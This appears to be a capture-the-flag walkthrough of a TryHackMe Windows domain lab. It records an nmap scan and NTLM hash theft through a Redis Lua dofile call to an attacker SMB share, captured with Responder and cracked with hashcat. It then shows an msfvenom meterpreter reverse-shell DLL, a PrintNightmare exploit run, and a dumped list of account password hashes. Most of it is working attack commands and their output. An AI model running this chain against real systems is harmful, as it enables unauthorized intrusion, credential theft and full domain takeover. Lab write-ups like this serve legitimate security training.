
```
┌──(root㉿kali)-[~]
└─# nmap -sV -O -p- 10.10.157.248

Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-07-08 23:00 EDT

Stats: 0:04:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.14% done; ETC: 23:05 (0:00:17 remaining)
Stats: 0:04:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.14% done; ETC: 23:05 (0:00:20 remaining)
Stats: 0:04:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.14% done; ETC: 23:06 (0:00:24 remaining)

Nmap scan report for 10.10.157.248

Host is up (0.093s latency).
Not shown: 65521 filtered tcp ports (no-response)
**PORT STATE SERVICE VERSION**
53/tcp open domain Simple DNS Plus
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
6379/tcp open redis Redis key-value store 2.8.2402
9389/tcp open mc-nmf .NET Message Framing
49666/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open msrpc Microsoft Windows RPC
49677/tcp open msrpc Microsoft Windows RPC
49696/tcp open msrpc Microsoft Windows RPC
49781/tcp open msrpc Microsoft Windows RPC

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

OS fingerprint not ideal because: Missing a closed TCP port so results incomplete

No OS matches for host

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .

Nmap done: 1 IP address (1 host up) scanned in 340.

r
```
We tried some queries for redis-cli from Redis Notes-Obsidian:
we did `get config *` -> that's how we get to know the Username is `enterprise-security` then we try to send request from redis to our tun0 interface ip address and capture the ntlm using responder.
```
eval "dofile('//10.130.144.23/share')" 0
```
And at the same time we were listening on another terminal on responder: Basically
```
┌──(root㉿kali)-[~/Responder]
└─# responder -I tun0 -dwv                                                                                                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.206.136]
    Responder IPv6             [fe80::15f9:b09b:d06:d05]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZCAUR9NG13Z]
    Responder Domain Name      [0XZ2.LOCAL]
    Responder DCE-RPC Port     [47146]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.66.140.23
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:06ec6dba694616ce:6EBBA02C50919D1EBD2BFD0E7A167E19:01010000000000008046BCC84978DC01375FF92F377FB2C00000000002000800300058005A00320001001E00570049004E002D005A00430041005500520039004E004700310033005A0004003400570049004E002D005A00430041005500520039004E004700310033005A002E00300058005A0032002E004C004F00430041004C0003001400300058005A0032002E004C004F00430041004C0005001400300058005A0032002E004C004F00430041004C00070008008046BCC84978DC0106000400020000000800300030000000000000000000000000300000D7C1C605C4EDD0CA7107B0ECCF5D5BDA2076F5D276F4F5D46937E7C5AD8E7DAF0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300036002E003100330036000000000000000000                                                                                                                     
[+] Exiting...

```


Get the powershell exploit for reverse shell and run it:
```└─# cd tryhackme/vulnet_active      
                                                                                                                            
┌──(root㉿kali)-[~/tryhackme/vulnet_active]
└─# hashcat -m 5600 ntlm_hash /usr/share/wordlists/rockyou.txt --show
ENTERPRISE-SECURITY::VULNNET:74324b6cceafa24f:8f1f5bc3fe209f1b57c682b8f7e1cee9:0101000000000000801dee42943cdc01ce486dddfcd70b0400000000020008005300580050005a0001001e00570049004e002d004a00380030003800410032004300580051005200470004003400570049004e002d004a0038003000380041003200430058005100520047002e005300580050005a002e004c004f00430041004c00030014005300580050005a002e004c004f00430041004c00050014005300580050005a002e004c004f00430041004c0007000800801dee42943cdc0106000400020000000800300030000000000000000000000000300000373fce5ec369db58d18c665025566a4e0d37b4e9744eabbc4940722670d74da70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0036002e00360033002e00350032000000000000000000:**sand_0873959498**
                                                                                                                            
┌──(root㉿kali)-[~/tryhackme/vulnet_active]
└─# nc -lvp 4444    
```
We get smbclinet login with this: then we can see with ls and get or put the .ps1 file.
```
┌──(root㉿kali)-[~]
└─# smbclient \\\\$target\\Enterprise-Share\\ -U enterprise-security
```
 
Get revershell with smbclient  put < file> it gets you reverse shell/bind also possible: then run nc on that port.
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Use rcpdump.py to check if this is vulnerable to rpc 135 vuln.

We are going to run PrintNighmare exploit:
https://github.com/nathanealm/PrintNightmare-Exploit
https://github.com/cube0x0/CVE-2021-1675
sand_0873959498
Use msvenom to craft the payload:
```
┌──(kali㉿kali)-[~/…/CVE-2021-1675/impacket/impacket/smb]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.6.63.52 LPORT=9000 -f dll -o ~/Desktop/Print_Mal.dll

```


Run smbserver
```
smbserver.py share /compelte/path/to/run/the/smb/server/where/file/is -smb2support
```

### Verify remote can list/read the file (test from the attacking or client host)
Then you can check from another terminal if the smb server is pointed to correct dir:
Use `smbclient` to list or download the file exactly as the remote spooler would request it:
```
# list
smbclient //10.6.63.52/smb -N -c 'ls'

# try to download
smbclient //10.6.63.52/smb -N -c 'get Print_Mal.dll'

```

```
──(kali㉿kali)-[~/Desktop/CVE-2021-1675]
└─$ smbclient //10.6.63.52/smb -N -c 'ls; get Print_Mal.dll'
  Print_Mal.dll                      AN     9216  Tue Oct 14 22:30:35 2025

                148529400 blocks of size 1024. 14851044 blocks available
getting file \Print_Mal.dll of size 9216 as Print_Mal.dll (1125.0 KiloBytes/sec) (average 1125.0 KiloBytes/sec)
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/CVE-2021-1675]

```


The final terminal
```
──(kali㉿kali)-[~/Desktop/CVE-2021-1675]
└─$ python CVE-2021-1675.py vulnnet/enterprise-security:sand_0873959498@10.201.57.196 '\\10.6.63.52\smb\Print_Mal.dll'

```


```
getsystem

hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66d7c6f99b03f0d7f520e1e0e55f9149:::
enterprise-security:1103:aad3b435b51404eeaad3b435b51404ee:41ab3f4e60ca2215f8ae1b79b23edc10:::
jack-goldenhand:1104:aad3b435b51404eeaad3b435b51404ee:0f27eaa88eeed8637b2f38d0f2c8dab4:::
tony-skid:1105:aad3b435b51404eeaad3b435b51404ee:aadd887bcc436ae6787c876f3bf118fe:::
VULNNET-BC3TCK1$:1000:aad3b435b51404eeaad3b435b51404ee:06602016c7b83be1048899777114726d:::


		

meterpreter > sysinfo
Computer        : VULNNET-BC3TCK1
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : VULNNET
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > 

```